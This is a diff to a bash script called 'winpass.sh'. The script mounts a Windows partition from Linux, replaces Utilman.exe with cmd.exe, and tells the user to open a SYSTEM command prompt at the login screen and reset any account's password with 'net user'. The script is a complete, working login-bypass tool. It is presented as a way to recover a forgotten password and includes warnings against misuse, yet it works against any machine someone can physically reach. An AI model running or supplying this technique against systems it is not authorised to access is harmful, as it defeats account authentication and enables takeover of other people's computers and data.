@@ -1,97 +1,109 @@
 #!/bin/bash
-# 
 # Script: winpass.sh
 # Description: Swap Utilman.exe with cmd.exe on a Windows partition for password reset.
 # Usage: sudo ./winpass.sh /dev/sdXY
-#
-# Winpass bypass by leomuguchia
-#
-# Disclaimer:
-# This script is intended to be run on a Linux live mode or Linux distribution.
-# It allows the user to gain access to a command prompt session before logging into a user account.
-# This can help users change their password if they have forgotten it.
-# This script is NOT intended for malicious purposes. Users are responsible for their actions.
-# Ensure that Linux is either installed on the same disk or a different disk, as long as the Windows
-# partition that needs bypassing is accessible.
-#
-# Note: Make this script executable before running it:
-# chmod +x winpass.sh
+# Note: Ensure you are in a Linux live session or a Linux distro environment.
 
-# Display script information
-echo "Winpass Bypass by leomuguchia"
-echo "This script swaps Utilman.exe with cmd.exe on a Windows partition, allowing you to reset a password."
-echo "Run this script responsibly. Misuse is strictly discouraged."
+# Colors for terminal output
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+YELLOW='\033[1;33m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
+clear
+echo -e "${CYAN}Winpass Bypass${NC}"
+echo -e "${YELLOW}By leomuguchia - Swap Utilman.exe with cmd.exe for password reset.${NC}"
+echo -e "${RED}WARNING: Use responsibly. Unauthorized access is illegal!${NC}"
 echo
 
-# Check if the script is run as root
+# Ensure script is run as root
+echo -e "${CYAN}[#] Checking root permissions...${NC}"
 if [[ $EUID -ne 0 ]]; then
-    echo "This script must be run as root. Use sudo." >&2
+    echo -e "${RED}[!] Error: This script must be run as root. Use sudo.${NC}" >&2
     exit 1
 fi
 
-# Check if the device argument is provided
+# Ensure a device argument is provided
 if [ -z "$1" ]; then
-    echo "Usage: $0 /dev/sdXY" >&2
+    echo -e "${RED}[!] Error: No device provided. Usage: $0 /dev/sdXY${NC}" >&2
     exit 1
 fi
 
 WINDOWS_PARTITION=$1
 MOUNT_POINT="/mnt/windows"
 
-# Create mount point
-sudo mkdir -p "$MOUNT_POINT"
+# Step 1: Unmount if mounted
+echo -e "${CYAN}[+] Checking if $WINDOWS_PARTITION is mounted...${NC}"
+if mount | grep "$WINDOWS_PARTITION" > /dev/null; then
+    echo -e "${YELLOW}[+] Unmounting $WINDOWS_PARTITION...${NC}"
+    sudo umount "$WINDOWS_PARTITION"
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}[!] Error: Unable to unmount $WINDOWS_PARTITION.${NC}" >&2
+        exit 1
+    fi
+fi
 
-# Mount the Windows partition
-sudo mount -o rw "$WINDOWS_PARTITION" "$MOUNT_POINT"
+# Step 2: Run ntfsfix
+echo -e "${CYAN}[+] Running ntfsfix on $WINDOWS_PARTITION...${NC}"
+sudo ntfsfix "$WINDOWS_PARTITION"
 if [ $? -ne 0 ]; then
-    echo "Failed to mount $WINDOWS_PARTITION." >&2
+    echo -e "${RED}[!] Error: ntfsfix failed.${NC}" >&2
     exit 1
 fi
 
-echo "Mounted $WINDOWS_PARTITION at $MOUNT_POINT."
+# Step 3: Mount the partition as read-write
+echo -e "${CYAN}[+] Mounting $WINDOWS_PARTITION as read-write...${NC}"
+sudo mkdir -p "$MOUNT_POINT"
+sudo mount -o rw "$WINDOWS_PARTITION" "$MOUNT_POINT"
+if [ $? -ne 0 ]; then
+    echo -e "${RED}[!] Error: Unable to mount $WINDOWS_PARTITION.${NC}" >&2
+    exit 1
+fi
 
 # Define paths
 UTILMAN_PATH="$MOUNT_POINT/Windows/System32/Utilman.exe"
 CMD_PATH="$MOUNT_POINT/Windows/System32/cmd.exe"
 BACKUP_PATH="$MOUNT_POINT/Windows/System32/Utilman.bak"
 
-# Backup the original Utilman.exe
+# Step 4: Backup Utilman.exe
+echo -e "${CYAN}[+] Backing up Utilman.exe...${NC}"
 if [ -f "$UTILMAN_PATH" ]; then
     sudo mv "$UTILMAN_PATH" "$BACKUP_PATH"
-    echo "Backed up Utilman.exe to Utilman.bak."
+    echo -e "${YELLOW}[+] Backup completed: Utilman.exe -> Utilman.bak${NC}"
 else
-    echo "Utilman.exe not found at $UTILMAN_PATH." >&2
+    echo -e "${RED}[!] Error: Utilman.exe not found.${NC}" >&2
     sudo umount "$MOUNT_POINT"
     exit 1
 fi
 
-# Replace Utilman.exe with cmd.exe
+# Step 5: Replace Utilman.exe with cmd.exe
+echo -e "${CYAN}[+] Replacing Utilman.exe with cmd.exe...${NC}"
 if [ -f "$CMD_PATH" ]; then
     sudo cp "$CMD_PATH" "$UTILMAN_PATH"
-    echo "Replaced Utilman.exe with cmd.exe."
+    echo -e "${YELLOW}[+] Replacement complete: Utilman.exe -> cmd.exe${NC}"
 else
-    echo "cmd.exe not found at $CMD_PATH." >&2
-    # Restore Utilman if replacement fails
+    echo -e "${RED}[!] Error: cmd.exe not found. Restoring original Utilman.exe...${NC}"
     sudo mv "$BACKUP_PATH" "$UTILMAN_PATH"
-    echo "Restored original Utilman.exe."
     sudo umount "$MOUNT_POINT"
     exit 1
 fi
 
-# Unmount the partition
+# Step 6: Unmount the partition
+echo -e "${CYAN}[+] Unmounting $WINDOWS_PARTITION...${NC}"
 sudo umount "$MOUNT_POINT"
 if [ $? -eq 0 ]; then
-    echo "Unmounted $WINDOWS_PARTITION successfully."
+    echo -e "${YELLOW}[+] Unmounted successfully.${NC}"
 else
-    echo "Failed to unmount $WINDOWS_PARTITION." >&2
-    exit 1
+    echo -e "${RED}[!] Warning: Failed to unmount. Ensure partition is not in use.${NC}"
 fi
 
-# Completion message
-echo "Utilman.exe has been replaced with cmd.exe."
-echo "Reboot into Windows, click the Ease of Access icon, and type the following command to reset your password:"
-echo "net user <username> <newpassword>"
-echo "For example: net user Administrator MyNewPassword123"
-echo "Once done, consider restoring the original Utilman.exe for system integrity."
-
-exit 0
+# Final message
+echo
+echo -e "${CYAN}Operation Complete.${NC}"
+echo -e "${YELLOW}To reset the password, reboot into Windows, press Ease of Access, and type:${NC}"
+echo -e "${CYAN}net user <username> <newpassword>${NC}"
+echo -e "${YELLOW}Example: net user Administrator NewPassword123${NC}"
+echo
+echo -e "${RED}IMPORTANT: Restore Utilman.exe for system integrity after use.${NC}"
+echo -e "${CYAN}Thank you for using Winpass!${NC}"
